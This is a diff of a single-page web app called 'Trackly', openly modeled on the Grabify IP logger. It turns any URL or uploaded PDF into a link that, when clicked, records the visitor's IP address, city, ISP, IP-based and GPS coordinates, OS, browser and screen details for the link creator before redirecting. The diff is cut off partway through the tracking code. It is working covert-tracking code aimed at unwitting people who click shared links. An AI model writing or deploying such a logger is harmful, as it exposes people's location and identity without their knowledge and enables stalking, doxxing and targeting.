@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Trackly · Smart URL & PDF Tracker (Grabify-style)</title>
-    <!-- Font Awesome Icons -->
+    <title>Trackly | PDF & URL Tracking Link Generator + Secure PDF Viewer</title>
+    <!-- Font Awesome & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <!-- QR Code Library for optional link sharing -->
-    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -16,10 +14,10 @@
         }
 
         body {
-            background: linear-gradient(145deg, #0a0f1e 0%, #0f172a 100%);
-            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(145deg, #0B1120 0%, #111827 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
             padding: 2rem 1rem;
-            min-height: 100vh;
+            color: #e2e8f0;
         }
 
         .container {
@@ -27,15 +25,14 @@
             margin: 0 auto;
         }
 
-        /* header */
+        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 2.5rem;
+            margin-bottom: 2rem;
         }
-
         .header h1 {
-            font-size: 2.3rem;
-            background: linear-gradient(135deg, #c084fc, #60a5fa);
+            font-size: 2.2rem;
+            background: linear-gradient(135deg, #60a5fa, #a78bfa);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
@@ -43,33 +40,35 @@
             align-items: center;
             gap: 12px;
         }
-
-        .header p {
+        .badge {
+            background: #1e293b;
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 0.75rem;
             color: #94a3b8;
-            margin-top: 0.5rem;
         }
 
-        /* card grid */
-        .tracker-grid {
+        /* Grid Layout */
+        .dashboard {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 2rem;
+            grid-template-columns: 1fr 1.2fr;
+            gap: 1.8rem;
         }
 
+        /* Cards */
         .card {
-            background: rgba(15, 25, 45, 0.7);
+            background: rgba(15, 25, 45, 0.75);
             backdrop-filter: blur(12px);
             border-radius: 2rem;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 1.8rem;
-            transition: 0.2s;
-            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 1.6rem;
+            transition: all 0.2s;
+            box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4);
         }
 
         .card h2 {
             font-size: 1.5rem;
-            color: #f1f5f9;
-            margin-bottom: 1rem;
+            margin-bottom: 1.2rem;
             display: flex;
             align-items: center;
             gap: 10px;
@@ -78,18 +77,16 @@
         }
 
         .input-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.3rem;
         }
-
         label {
-            display: block;
-            color: #cbd5e6;
+            font-size: 0.8rem;
             font-weight: 500;
-            margin-bottom: 8px;
-            font-size: 0.85rem;
+            display: block;
+            margin-bottom: 6px;
+            color: #cbd5e6;
         }
-
-        input, textarea {
+        input, select, textarea {
             width: 100%;
             padding: 12px 16px;
             background: #0f172a;
@@ -99,571 +96,539 @@
             font-size: 0.9rem;
             transition: 0.2s;
         }
-
         input:focus, textarea:focus {
             outline: none;
             border-color: #3b82f6;
             box-shadow: 0 0 0 2px rgba(59,130,246,0.3);
         }
-
-        .file-zone {
-            border: 2px dashed #334155;
-            border-radius: 1.5rem;
-            padding: 1.5rem;
-            text-align: center;
-            background: #0a0f1c;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .file-zone:hover {
-            border-color: #60a5fa;
-            background: #1e293b50;
-        }
-
-        .btn {
-            background: linear-gradient(95deg, #2563eb, #4f46e5);
+        button {
+            background: linear-gradient(95deg, #3b82f6, #2563eb);
             border: none;
-            padding: 12px 24px;
+            padding: 12px 20px;
             border-radius: 2rem;
             font-weight: 600;
             color: white;
             cursor: pointer;
-            transition: 0.2s;
             width: 100%;
-            font-size: 1rem;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+            font-size: 0.9rem;
+            transition: 0.2s;
+            margin-top: 6px;
         }
-
-        .btn-secondary {
-            background: #334155;
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px -5px #3b82f680;
         }
-
-        .btn-secondary:hover {
-            background: #475569;
-        }
-
-        .tracking-link-area {
-            margin-top: 1.5rem;
-            background: #02061780;
-            border-radius: 1.2rem;
-            padding: 1rem;
-        }
-
-        .link-box {
-            display: flex;
-            gap: 8px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .link-box input {
-            flex: 1;
+        .track-link {
+            background: #020617;
+            padding: 12px;
+            border-radius: 1rem;
+            margin: 15px 0;
+            word-break: break-all;
             font-family: monospace;
             font-size: 0.8rem;
-        }
-
-        .badge {
-            background: #1e293b;
-            padding: 5px 12px;
-            border-radius: 40px;
-            font-size: 0.7rem;
-            color: #94a3b8;
-        }
-
-        /* logs table */
-        .log-section {
-            margin-top: 2.5rem;
-            background: #0f172ad9;
-            border-radius: 1.8rem;
-            padding: 1.5rem;
-            backdrop-filter: blur(8px);
-            border: 1px solid #334155;
-        }
-
-        .log-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
-            margin-bottom: 1.2rem;
-        }
-
-        .log-header h3 {
-            color: #facc15;
-            display: flex;
             gap: 8px;
-            align-items: center;
+            flex-wrap: wrap;
+        }
+        .copy-btn {
+            width: auto;
+            background: #334155;
+            padding: 6px 12px;
+            margin: 0;
+            font-size: 0.7rem;
+        }
+        .alert {
+            background: #22c55e20;
+            border-left: 3px solid #22c55e;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            margin-top: 12px;
         }
 
+        /* Tracking logs table */
+        .logs-area {
+            margin-top: 2rem;
+        }
+        .log-table-wrapper {
+            overflow-x: auto;
+            max-height: 380px;
+            overflow-y: auto;
+            border-radius: 1rem;
+        }
         table {
             width: 100%;
             border-collapse: collapse;
             font-size: 0.75rem;
-            overflow-x: auto;
-            display: block;
         }
-
         th, td {
-            text-align: left;
             padding: 10px 8px;
-            border-bottom: 1px solid #334155;
-            color: #e2e8f0;
+            text-align: left;
+            border-bottom: 1px solid #1e293b;
         }
-
         th {
-            color: #94a3b8;
-            font-weight: 600;
+            background: #0f172a;
+            position: sticky;
+            top: 0;
+            color: #94a3f0;
         }
-
-        .mobile-badge {
-            background: #0f3b2c;
-            color: #4ade80;
+        .badge-device {
+            background: #1e293b;
             padding: 2px 8px;
-            border-radius: 30px;
+            border-radius: 20px;
             font-size: 0.7rem;
         }
-
-        .computer-badge {
-            background: #1e3a8a;
-            color: #93c5fd;
-        }
-
         .clear-btn {
-            background: #7f1a1a;
-            padding: 6px 14px;
-            font-size: 0.75rem;
-            border-radius: 30px;
+            background: #dc262630;
+            color: #f87171;
+            margin-top: 10px;
+            width: auto;
+            padding: 6px 12px;
         }
-
-        .footer-note {
-            margin-top: 2rem;
-            text-align: center;
+        .pdf-viewer-area {
+            margin-top: 1.8rem;
+        }
+        .pdf-container {
+            background: #020617;
+            border-radius: 1.2rem;
+            height: 550px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #334155;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .restricted-overlay {
+            pointer-events: none;
+        }
+        .note {
             font-size: 0.7rem;
-            color: #5b6e8c;
+            text-align: center;
+            color: #6c86a3;
+            margin-top: 12px;
         }
-
         @media (max-width: 880px) {
-            .tracker-grid {
+            .dashboard {
                 grid-template-columns: 1fr;
             }
+        }
+        .flex-row {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        .danger {
+            background: #dc2626;
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1><i class="fas fa-link"></i> Trackly · Smart URL/PDF Tracker</h1>
-        <p>Convert any URL or PDF into a tracking link → Get full IP, geolocation, device fingerprint (Grabify style)</p>
+        <h1><i class="fas fa-link"></i> Trackly · Smart Tracker <i class="fas fa-chart-line"></i></h1>
+        <div class="badge"><i class="fas fa-shield-alt"></i> IP Logger | GPS Coordinates | PDF Secure Viewer</div>
+        <p style="margin-top: 8px;">Convert any URL or PDF into a tracking link. Get full visitor analytics + location + device fingerprint</p>
     </div>
 
-    <div class="tracker-grid">
-        <!-- LEFT: URL TRACKER -->
+    <div class="dashboard">
+        <!-- LEFT PANEL: Create Tracking Link -->
         <div class="card">
-            <h2><i class="fas fa-globe"></i> Track any URL</h2>
+            <h2><i class="fas fa-plus-circle"></i> Create Trackable Link</h2>
             <div class="input-group">
-                <label><i class="fas fa-paperclip"></i> Destination URL (website / hosted PDF)</label>
-                <input type="text" id="targetUrl" placeholder="https://example.com/document.pdf or https://any-site.com">
+                <label><i class="fas fa-globe"></i> Destination URL or PDF Link (Google Drive/Any URL)</label>
+                <input type="text" id="destinationUrl" placeholder="https://example.com/document.pdf  or  https://drive.google.com/file/d/.../view?usp=sharing">
             </div>
-            <button class="btn" id="createUrlBtn"><i class="fas fa-chart-line"></i> Generate Tracking Link</button>
-            <div id="urlTrackingResult" class="tracking-link-area" style="display: none;">
-                <div class="link-box">
-                    <input type="text" id="trackingLinkInput" readonly>
-                    <button id="copyLinkBtn" class="btn-secondary" style="width: auto; padding: 8px 16px;"><i class="fas fa-copy"></i></button>
-                    <div id="urlQrMini" style="margin-top: 10px;"></div>
+            <div class="input-group">
+                <label><i class="fas fa-file-pdf"></i> OR Upload PDF (will be hosted locally for secure view)</label>
+                <input type="file" id="pdfUpload" accept="application/pdf">
+                <small style="color:#8aa0c0;">Uploaded PDF will be stored in browser & generate tracking link without external hosting.</small>
+            </div>
+            <button id="generateBtn"><i class="fas fa-magic"></i> Generate Tracking Link</button>
+            <div id="trackingLinkContainer" style="display: none;">
+                <div class="track-link">
+                    <span id="trackingUrlText"></span>
+                    <button id="copyLinkBtn" class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
                 </div>
-                <div class="badge" style="margin-top: 8px;"><i class="fas fa-shield-alt"></i> Every click logs visitor data + redirect</div>
+                <div class="alert"><i class="fas fa-info-circle"></i> Share this link. Every click logs IP, location (lat/long), device, and more!</div>
             </div>
         </div>
 
-        <!-- RIGHT: PDF UPLOADER (convert to tracking link) -->
+        <!-- RIGHT PANEL: Live Tracking Dashboard -->
         <div class="card">
-            <h2><i class="fas fa-file-pdf"></i> Upload PDF → Tracking Link</h2>
-            <div class="input-group">
-                <label><i class="fas fa-cloud-upload-alt"></i> Select PDF file (max 15MB)</label>
-                <div class="file-zone" id="pdfDropZone">
-                    <i class="fas fa-file-pdf fa-2x" style="color:#ef4444;"></i>
-                    <p style="margin-top: 8px;">Click or drag PDF here</p>
-                    <input type="file" id="pdfFileInput" accept=".pdf" style="display: none;">
-                </div>
-                <div id="pdfPreview" style="margin-top: 12px; font-size: 0.8rem; color:#86efac;"></div>
+            <h2><i class="fas fa-chart-simple"></i> Live Clicks & Visitor Intelligence</h2>
+            <div class="flex-row" style="justify-content: space-between; margin-bottom: 12px;">
+                <span><i class="fas fa-eye"></i> Total Clicks: <strong id="clickCount">0</strong></span>
+                <button id="clearLogsBtn" class="clear-btn"><i class="fas fa-trash-alt"></i> Clear History</button>
             </div>
-            <button class="btn" id="createPdfBtn" disabled><i class="fas fa-qrcode"></i> Create PDF Tracking Link</button>
-            <div id="pdfTrackingResult" class="tracking-link-area" style="display: none;">
-                <div class="link-box">
-                    <input type="text" id="pdfTrackingLinkInput" readonly>
-                    <button id="copyPdfLinkBtn" class="btn-secondary" style="width: auto;"><i class="fas fa-copy"></i></button>
-                </div>
-                <div class="badge"><i class="fas fa-database"></i> PDF stored locally (IndexedDB) + tracking before redirect</div>
+            <div class="log-table-wrapper">
+                <table id="visitorTable">
+                    <thead>
+                        <tr><th>Time</th><th>IP Address</th><th>Location (City, Country)</th><th>Lat/Long</th><th>Device/OS</th><th>ISP</th></tr>
+                    </thead>
+                    <tbody id="logBody">
+                        <tr><td colspan="6" style="text-align:center;">No visits yet. Share tracking link →</td></tr>
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 
-    <!-- LIVE TRACKING DASHBOARD -->
-    <div class="log-section">
-        <div class="log-header">
-            <h3><i class="fas fa-chart-simple"></i> 📡 Visitor Logs (Real-time, stored in browser)</h3>
-            <button id="clearLogsBtn" class="btn-secondary clear-btn"><i class="fas fa-trash"></i> Clear logs</button>
-        </div>
-        <div style="overflow-x: auto;">
-            <table id="visitorLogTable">
-                <thead>
-                    <tr><th>Time</th><th>IP Address</th><th>Location (City, Country)</th><th>Device / OS</th><th>Browser</th><th>ISP</th><th>Screen</th><th>Target</th></tr>
-                </thead>
-                <tbody id="logTableBody">
-                    <tr><td colspan="8" style="text-align:center;">No visitors yet. Generate tracking link and click from any device.</td></tr>
-                </tbody>
-            </table>
-        </div>
-        <div class="footer-note">
-            <i class="fas fa-info-circle"></i> Tracking works like Grabify: each click logs IP, geo, device, userAgent, coordinates, ISP. Redirect happens instantly.
+    <!-- PDF SECURE VIEWER (with restrictions) -->
+    <div class="pdf-viewer-area" id="pdfViewerSection" style="display: none;">
+        <div class="card">
+            <h2><i class="fas fa-file-pdf"></i> Secure PDF Preview (No Right-Click / No Print / No Download)</h2>
+            <div class="pdf-container" id="pdfContainer">
+                <iframe id="pdfFrame" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals" style="pointer-events: auto;"></iframe>
+            </div>
+            <div class="note"><i class="fas fa-lock"></i> Right-click, print, and save disabled by security layer. Viewer-only mode.</div>
         </div>
     </div>
 </div>
 
 <script>
-    // ---------- GLOBAL STORAGE ----------
-    let clickLogs = [];   // store all tracking events
-    
-    // Helper: load logs from localStorage
+    // ---------- STORAGE ----------
+    let trackingDatabase = [];   // store logs
+    let activeTrackingId = null;
+    let currentRedirectUrl = "";   // original destination
+    let isPdfMode = false;
+    let blobPdfUrl = null;
+
+    // Load logs from localStorage
     function loadLogsFromStorage() {
-        const stored = localStorage.getItem('trackly_visitor_logs');
-        if (stored) {
-            try {
-                clickLogs = JSON.parse(stored);
-                renderLogTable();
-            } catch(e) {}
+        const stored = localStorage.getItem("trackly_logs");
+        if(stored) {
+            trackingDatabase = JSON.parse(stored);
+        } else {
+            trackingDatabase = [];
         }
-    }
-    
-    function saveLogsToStorage() {
-        localStorage.setItem('trackly_visitor_logs', JSON.stringify(clickLogs.slice(0, 200))); // keep last 200
+        updateClickCount();
         renderLogTable();
     }
-    
-    function addLogEntry(entry) {
-        clickLogs.unshift(entry); // newest first
-        if (clickLogs.length > 200) clickLogs.pop();
-        saveLogsToStorage();
+
+    function saveLogs() {
+        localStorage.setItem("trackly_logs", JSON.stringify(trackingDatabase));
+        updateClickCount();
+        renderLogTable();
     }
-    
-    // render dynamic table
+
+    function updateClickCount() {
+        document.getElementById("clickCount").innerText = trackingDatabase.length;
+    }
+
     function renderLogTable() {
-        const tbody = document.getElementById('logTableBody');
-        if (!clickLogs.length) {
-            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;">✨ No visitors yet. Click your tracking link from another device/browser.</td></tr>';
+        const tbody = document.getElementById("logBody");
+        if(trackingDatabase.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">✨ No visits yet. Share tracking link →</td></tr>';
             return;
         }
-        tbody.innerHTML = clickLogs.map(log => `
+        tbody.innerHTML = trackingDatabase.slice().reverse().map(log => `
             <tr>
-                <td style="white-space: nowrap;">${new Date(log.timestamp).toLocaleString()}</td>
-                <td><code style="font-size:0.7rem;">${log.ip || 'unknown'}</code></td>
-                <td>${log.location || '—'}</td>
-                <td><span class="mobile-badge" style="background:${log.deviceType === 'mobile' ? '#0f3b2c' : '#1e3a8a'}">${log.device || '—'}</span></td>
-                <td>${log.browser || '—'}</td>
-                <td>${log.isp || '—'}</td>
-                <td>${log.screen || '—'}</td>
-                <td style="max-width:150px; overflow:hidden; text-overflow:ellipsis;">${log.targetShort || 'link'}</td>
+                <td>${new Date(log.timestamp).toLocaleString()}</td>
+                <td><span class="badge-device">${log.ip || 'N/A'}</span></td>
+                <td>${log.location || 'Unknown'}</td>
+                <td><i class="fas fa-map-marker-alt"></i> ${log.coordinates || '—'}</td>
+                <td>${log.device || '—'}</td>
+                <td>${log.isp?.substring(0, 20) || '—'}</td>
             </tr>
         `).join('');
     }
-    
-    // ----- UTILITIES: fetch IP, location, device details (enhanced)
-    async function collectTrackingData(originalDestination) {
-        // Fetch IP & location
-        let ipData = { ip: 'unknown', city: 'Unknown', region: '', country: 'Unknown', org: 'Unknown ISP', lat: '', lon: '' };
+
+    // Enhanced IP + GEOLOCATION (Lat/Long + City + ISP) using ipapi.co + browser geolocation (optional)
+    async function fetchRichVisitorData() {
         try {
+            // Base IP data
             const res = await fetch('https://ipapi.co/json/');
-            if (res.ok) {
-                const data = await res.json();
-                ipData = {
-                    ip: data.ip || 'unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region || '',
-                    country: data.country_name || 'Unknown',
-                    org: data.org || 'Unknown ISP',
-                    lat: data.latitude,
-                    lon: data.longitude
-                };
-            } else {
-                const fallback = await fetch('https://api.ipify.org?format=json');
-                const fallbackJson = await fallback.json();
-                ipData.ip = fallbackJson.ip;
-            }
-        } catch(e) { console.warn("geo fail", e); }
-        
-        const ua = navigator.userAgent;
-        let os = "Unknown OS";
-        if (ua.indexOf("Win") !== -1) os = "Windows";
-        else if (ua.indexOf("Mac") !== -1) os = "macOS";
-        else if (ua.indexOf("Android") !== -1) os = "Android";
-        else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
-        else if (ua.indexOf("Linux") !== -1) os = "Linux";
-        
-        let browser = "Unknown";
-        if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1 && ua.indexOf("OPR") === -1) browser = "Chrome";
-        else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
-        else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
-        else if (ua.indexOf("Edg") !== -1) browser = "Edge";
-        else if (ua.indexOf("OPR") !== -1) browser = "Opera";
-        
-        const deviceType = (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) ? "mobile" : "computer";
-        const screenRes = `${screen.width}x${screen.height}`;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        
-        const locationStr = `${ipData.city}, ${ipData.region ? ipData.region+', ' : ''}${ipData.country}`;
-        const coordinates = (ipData.lat && ipData.lon) ? `${ipData.lat}, ${ipData.lon}` : 'N/A';
-        
-        const detailedLog = {
-            timestamp: new Date().toISOString(),
-            ip: ipData.ip,
-            location: locationStr,
-            isp: ipData.org,
-            coordinates: coordinates,
-            device: `${os} | ${browser}`,
-            deviceType: deviceType,
-            browser: browser,
-            os: os,
-            screen: screenRes,
-            language: language,
-            platform: platform,
-            userAgent: ua,
-            targetShort: originalDestination.length > 60 ? originalDestination.substring(0,60)+"…" : originalDestination,
-            originalDestination: originalDestination
-        };
-        return detailedLog;
-    }
-    
-    // ----- TRACKING REDIRECT PAGE LOGIC (this is the heart)
-    // We'll implement a dynamic tracking endpoint using URL hash / query parameter
-    // We'll handle it globally: if page URL contains ?track=base64EncodedDestination or ?pdfId=...
-    function setupTrackingInterceptor() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const trackParam = urlParams.get('track');
-        const pdfIdParam = urlParams.get('pdfId');
-        
-        if (!trackParam && !pdfIdParam) return; // normal mode
-        
-        // TRACKING MODE: log visitor and redirect
-        (async () => {
-            let destination = null;
-            let logContext = '';
-            if (trackParam) {
-                try {
-                    destination = atob(decodeURIComponent(trackParam));
-                    logContext = destination;
-                } catch(e) { destination = null; }
-            } else if (pdfIdParam) {
-                // retrieve PDF blob from IndexedDB
-                const pdfBlob = await getPdfBlob(pdfIdParam);
-                if (pdfBlob) {
-                    const blobUrl = URL.createObjectURL(pdfBlob);
-                    destination = blobUrl;
-                    logContext = `PDF_${pdfIdParam.substring(0,8)}`;
-                } else {
-                    destination = '/404';
+            if (!res.ok) throw new Error();
+            const data = await res.json();
+            let latitude = data.latitude;
+            let longitude = data.longitude;
+            let locationStr = `${data.city || 'Unknown'}, ${data.region || ''}, ${data.country_name || 'Unknown'}`;
+            let coordsStr = (latitude && longitude) ? `${latitude}, ${longitude}` : 'Not available';
+
+            // Try to get more precise coordinates via browser Geolocation API (with user consent)
+            // This gives real GPS if allowed (like Grabify extra)
+            if (navigator.geolocation) {
+                const geoPos = await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(pos => resolve(pos), () => resolve(null), { timeout: 5000 });
+                });
+                if (geoPos && geoPos.coords) {
+                    const preciseLat = geoPos.coords.latitude;
+                    const preciseLon = geoPos.coords.longitude;
+                    latitude = preciseLat;
+                    longitude = preciseLon;
+                    coordsStr = `${preciseLat}, ${preciseLon} (GPS)`;
+                    // Also update location using reverse? keep original city but add precision note
+                    locationStr = `${data.city || '?'}, ${data.country_name || '?'} (GPS approx)`;
                 }
             }
+
+            // Device details
+            const ua = navigator.userAgent;
+            let os = "Unknown", browser = "Unknown";
+            if (ua.indexOf("Win") !== -1) os = "Windows";
+            else if (ua.indexOf("Mac") !== -1) os = "macOS";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
             
-            if (!destination) {
-                document.body.innerHTML = '<h2>Invalid tracking link</h2><a href="/">Go back</a>';
-                return;
-            }
-            
-            // collect full fingerprint
-            const visitData = await collectTrackingData(logContext);
-            // store in global logs (for the dashboard of the link creator)
-            addLogEntry(visitData);
-            // optional: also send to any webhook (telegram/email simulation? but we show logs)
-            console.log("🔴 TRACKED VISITOR", visitData);
-            
-            // display a subtle message before redirect (optional but fast)
-            const preloader = document.createElement('div');
-            preloader.style.position = 'fixed'; preloader.style.bottom = '10px'; preloader.style.right = '10px';
-            preloader.style.background = '#000000aa'; preloader.style.color = 'white'; preloader.style.padding = '6px 12px';
-            preloader.style.borderRadius = '20px'; preloader.style.fontSize = '12px'; preloader.style.zIndex = '9999';
-            preloader.innerHTML = '🔒 Tracking recorded → redirecting...';
-            document.body.appendChild(preloader);
-            
-            setTimeout(() => {
-                window.location.href = destination;
-            }, 800);
-        })();
-    }
-    
-    // ------ IndexedDB for PDF storage (keep PDF binary for redirect)
-    const DB_NAME = 'TracklyDB';
-    const STORE_NAME = 'pdfStore';
-    let dbPromise = null;
-    
-    function openDB() {
-        if (dbPromise) return dbPromise;
-        dbPromise = new Promise((resolve, reject) => {
-            const request = indexedDB.open(DB_NAME, 1);
-            request.onupgradeneeded = (ev) => {
-                const db = ev.target.result;
-                if (!db.objectStoreNames.contains(STORE_NAME)) {
-                    db.createObjectStore(STORE_NAME, { keyPath: 'id' });
-                }
+            if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+            else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
+            else if (ua.indexOf("Edg") !== -1) browser = "Edge";
+
+            const screenRes = `${screen.width}x${screen.height}`;
+            return {
+                timestamp: new Date().toISOString(),
+                ip: data.ip || 'unknown',
+                location: locationStr,
+                isp: data.org || 'Unknown ISP',
+                coordinates: coordsStr,
+                device: `${os} | ${browser}`,
+                screen: screenRes,
+                language: navigator.language,
+                platform: navigator.platform,
+                userAgent: ua,
+                raw: data
             };
-            request.onsuccess = () => resolve(request.result);
-            request.onerror = () => reject(request.error);
-        });
-        return dbPromise;
-    }
-    
-    async function savePdfBlob(id, blob) {
-        const db = await openDB();
-        const tx = db.transaction(STORE_NAME, 'readwrite');
-        const store = tx.objectStore(STORE_NAME);
-        store.put({ id: id, blob: blob, timestamp: Date.now() });
-        return new Promise((resolve) => { tx.oncomplete = resolve; });
-    }
-    
-    async function getPdfBlob(id) {
-        const db = await openDB();
-        const tx = db.transaction(STORE_NAME, 'readonly');
-        const store = tx.objectStore(STORE_NAME);
-        const request = store.get(id);
-        return new Promise((resolve) => {
-            request.onsuccess = () => resolve(request.result ? request.result.blob : null);
-            request.onerror = () => resolve(null);
-        });
-    }
-    
-    // ----- Helper: generate tracking URL for any destination
-    function generateTrackingUrl(destinationRaw) {
-        const encoded = btoa(encodeURIComponent(destinationRaw));
-        const baseUrl = window.location.href.split('?')[0].split('#')[0];
-        return `${baseUrl}?track=${encoded}`;
-    }
-    
-    function generatePdfTrackingUrl(pdfId) {
-        const baseUrl = window.location.href.split('?')[0].split('#')[0];
-        return `${baseUrl}?pdfId=${pdfId}`;
-    }
-    
-    // ----- UI handlers
-    let currentPdfId = null;
-    let currentPdfBlob = null;
-    
-    // URL tracker
-    document.getElementById('createUrlBtn').addEventListener('click', () => {
-        const target = document.getElementById('targetUrl').value.trim();
-        if (!target) {
-            alert("Please enter a valid URL (http:// or https://)");
-            return;
+        } catch(e) {
+            console.warn("Fallback fetch", e);
+            return {
+                timestamp: new Date().toISOString(),
+                ip: 'unresolved',
+                location: 'Network restricted',
+                isp: '—',
+                coordinates: '—',
+                device: 'Unknown',
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+            };
         }
-        if (!target.startsWith('http')) {
-            alert("URL must start with http:// or https://");
-            return;
-        }
-        const trackingLink = generateTrackingUrl(target);
-        document.getElementById('trackingLinkInput').value = trackingLink;
-        const resultDiv = document.getElementById('urlTrackingResult');
-        resultDiv.style.display = 'block';
-        // show QR code mini
-        const qrDiv = document.getElementById('urlQrMini');
-        qrDiv.innerHTML = '';
-        new QRCode(qrDiv, {
-            text: trackingLink,
-            width: 100,
-            height: 100,
-            correctLevel: QRCode.CorrectLevel.M
-        });
-    });
-    
-    document.getElementById('copyLinkBtn').addEventListener('click', () => {
-        const input = document.getElementById('trackingLinkInput');
-        input.select();
-        document.execCommand('copy');
-        alert('Tracking link copied! Share it anywhere. Each click will appear in dashboard.');
-    });
-    
-    // PDF upload logic
-    const pdfInput = document.getElementById('pdfFileInput');
-    const dropZone = document.getElementById('pdfDropZone');
-    const createPdfBtn = document.getElementById('createPdfBtn');
-    let selectedPdfFile = null;
-    
-    dropZone.addEventListener('click', () => pdfInput.click());
-    dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.style.borderColor = '#60a5fa'; });
-    dropZone.addEventListener('dragleave', () => dropZone.style.borderColor = '#334155');
-    dropZone.addEventListener('drop', (e) => {
-        e.preventDefault();
-        const files = e.dataTransfer.files;
-        if (files.length && files[0].type === 'application/pdf') handlePdfFile(files[0]);
-    });
-    pdfInput.addEventListener('change', (e) => {
-        if (e.target.files.length) handlePdfFile(e.target.files[0]);
-    });
-    
-    function handlePdfFile(file) {
-        if (file.size > 15 * 1024 * 1024) {
-            alert("PDF size > 15MB, reduce size or use external URL option.");
-            return;
-        }
-        selectedPdfFile = file;
-        document.getElementById('pdfPreview').innerHTML = `<i class="fas fa-check-circle" style="color:#22c55e;"></i> Ready: ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
-        createPdfBtn.disabled = false;
-        currentPdfBlob = file;
     }
-    
-    createPdfBtn.addEventListener('click', async () => {
-        if (!currentPdfBlob) return;
-        const uniqueId = 'pdf_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-        await savePdfBlob(uniqueId, currentPdfBlob);
-        const trackingLink = generatePdfTrackingUrl(uniqueId);
-        document.getElementById('pdfTrackingLinkInput').value = trackingLink;
-        document.getElementById('pdfTrackingResult').style.display = 'block';
-        document.getElementById('copyPdfLinkBtn').onclick = () => {
-            const inp = document.getElementById('pdfTrackingLinkInput');
-            inp.select();
-            document.execCommand('copy');
-            alert('PDF tracking link copied! Anyone clicking will be logged and redirected to the PDF.');
+
+    // Log a visit (called from tracking endpoint simulation)
+    async function registerClick() {
+        const visitorData = await fetchRichVisitorData();
+        trackingDatabase.push(visitorData);
+        saveLogs();
+        // Show live toast (optional)
+        console.log("✅ VISITOR LOGGED:", visitorData);
+        return visitorData;
+    }
+
+    // ------------------ TRACKING REDIRECT ENGINE ------------------
+    // We'll generate a unique tracking link:  page.html#track_id={id}
+    // The current page will detect if there's a tracking param and then redirect after logging
+    function setupTrackingInterceptor() {
+        const hash = window.location.hash;
+        if (hash.startsWith('#track_id=')) {
+            const trackingId = hash.substring('#track_id='.length);
+            // Retrieve original destination + metadata from session/local
+            const storedMeta = localStorage.getItem(`track_meta_${trackingId}`);
+            if (storedMeta) {
+                const meta = JSON.parse(storedMeta);
+                const destination = meta.url;
+                const isPdfInternal = meta.isPdf || false;
+                // Register click immediately (async)
+                registerClick().then(async (logEntry) => {
+                    // after logging, redirect or show secure pdf
+                    if (isPdfInternal && destination && destination.startsWith('blob:')) {
+                        // Show secure PDF viewer (internal)
+                        window.location.hash = '';  // clean
+                        sessionStorage.setItem('secure_pdf_url', destination);
+                        sessionStorage.setItem('show_pdf_viewer', 'true');
+                        window.location.href = window.location.pathname; // reload without hash
+                    } else if (destination) {
+                        // Normal redirect
+                        window.location.href = destination;
+                    } else {
+                        window.location.href = '/';
+                    }
+                });
+                return true;
+            }
+        }
+        // check if we need to show PDF viewer after reload
+        const shouldShowPdf = sessionStorage.getItem('show_pdf_viewer');
+        if (shouldShowPdf === 'true') {
+            sessionStorage.removeItem('show_pdf_viewer');
+            const pdfBlobUrl = sessionStorage.getItem('secure_pdf_url');
+            if (pdfBlobUrl) {
+                displaySecurePdf(pdfBlobUrl);
+                sessionStorage.removeItem('secure_pdf_url');
